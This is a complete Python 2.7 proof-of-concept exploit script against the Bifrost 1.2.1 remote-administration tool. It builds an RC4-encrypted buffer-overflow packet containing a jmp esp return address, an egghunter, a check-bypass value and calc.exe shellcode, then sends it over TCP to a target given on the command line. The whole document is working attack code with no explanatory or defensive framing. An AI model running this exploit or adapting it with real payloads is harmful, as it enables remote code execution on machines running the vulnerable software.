#!/usr/bin/python2.7
#By : Mohamed Clay
import socket
from time import sleep
from itertools import izip, cycle
import base64
import sys

def rc4crypt(data, key):
    x = 0
    box = range(256)
    for i in range(256):
        x = (x + box[i] + ord(key[i % len(key)])) % 256
        box[i], box[x] = box[x], box[i]
    x = 0
    y = 0
    out = []
    for char in data:
        x = (x + 1) % 256
        y = (y + box[x]) % 256
        box[x], box[y] = box[y], box[x]
        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))
    
    return ''.join(out)

def bif_len(s):
    while len(s)<8:
         s=s+"00"
    return s

def header(s):
      a=(s[0]+s[1]).decode("hex")
      a+=(s[2]+s[3]).decode("hex")
      a+=(s[4]+s[5]).decode("hex")
      a+=(s[5]+s[6]).decode("hex")
      return a

def random():     
    a="" 
    for i in range(0,8):
        a+="A"*1000+"|"
    return a

def usage():

   print "\n\n\t***************************"
   print "\t*    By : Mohamed Clay    *"
   print "\t*  Bifrost 1.2.1 Exploit  *"
   print "\t***************************\n"
   print "\t  Usage : ./bifrost1.2.1 host port"
   print "\tExample : ./bifrost1.2.1 192.168.1.10 81\n\n"


if len(sys.argv)!=3:
    usage()
    exit()

HOST=sys.argv[1]
PORT=int(sys.argv[2])

key="\xA3\x78\x26\x35\x57\x32\x2D\x60\xB4\x3C\x2A\x5E\x33\x34\x72\x00"

xor="\xB2\x9C\x51\xBB" # we need this in order to bypass 0046A03E function
eip="\x53\x93\x3A\x7E" # jmp esp User32.dll

egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7";

#calc.exe shellcode (badchars "\x00")

buf ="\xb8\x75\xd3\x5c\x87\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9" 
buf +="\xb1\x33\x31\x43\x12\x83\xeb\xfc\x03\x36\xdd\xbe\x72\x44" 
buf +="\x09\xb7\x7d\xb4\xca\xa8\xf4\x51\xfb\xfa\x63\x12\xae\xca" 
buf +="\xe0\x76\x43\xa0\xa5\x62\xd0\xc4\x61\x85\x51\x62\x54\xa8" 
buf +="\x62\x42\x58\x66\xa0\xc4\x24\x74\xf5\x26\x14\xb7\x08\x26" 
buf +="\x51\xa5\xe3\x7a\x0a\xa2\x56\x6b\x3f\xf6\x6a\x8a\xef\x7d" 
buf +="\xd2\xf4\x8a\x41\xa7\x4e\x94\x91\x18\xc4\xde\x09\x12\x82" 
buf +="\xfe\x28\xf7\xd0\xc3\x63\x7c\x22\xb7\x72\x54\x7a\x38\x45" 
buf +="\x98\xd1\x07\x6a\x15\x2b\x4f\x4c\xc6\x5e\xbb\xaf\x7b\x59" 
buf +="\x78\xd2\xa7\xec\x9d\x74\x23\x56\x46\x85\xe0\x01\x0d\x89" 
buf +="\x4d\x45\x49\x8d\x50\x8a\xe1\xa9\xd9\x2d\x26\x38\x99\x09" 
buf +="\xe2\x61\x79\x33\xb3\xcf\x2c\x4c\xa3\xb7\x91\xe8\xaf\x55" 
buf +="\xc5\x8b\xed\x33\x18\x19\x88\x7a\x1a\x21\x93\x2c\x73\x10" 
buf +="\x18\xa3\x04\xad\xcb\x80\xfb\xe7\x56\xa0\x93\xa1\x02\xf1" 
buf +="\xf9\x51\xf9\x35\x04\xd2\x08\xc5\xf3\xca\x78\xc0\xb8\x4c" 
buf +="\x90\xb8\xd1\x38\x96\x6f\xd1\x68\xf5\xee\x41\xf0\xd4\x95" 
buf +="\xe1\x93\x28"


raw=(1000-533-len(egghunter))*"\x90"
raw2=(1000-8-len(buf))*"\x41"+"|"
command=30

tmp=hex(command).split("0x")[1]
data=tmp.decode("hex")+"F"*2+" "*511+xor+"C"*8+eip+"A"*12+egghunter+raw+"|"+" "*1000+"|"+"w00tw00t"+buf+raw2+random()
out=rc4crypt(data,key)
l=header(bif_len(str(hex(len(data))).split("0x")[1]))
out=l+out
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.sendall(out)
print "\n[*] By : Mohamed Clay"
print "[*] Exploit completed\n"





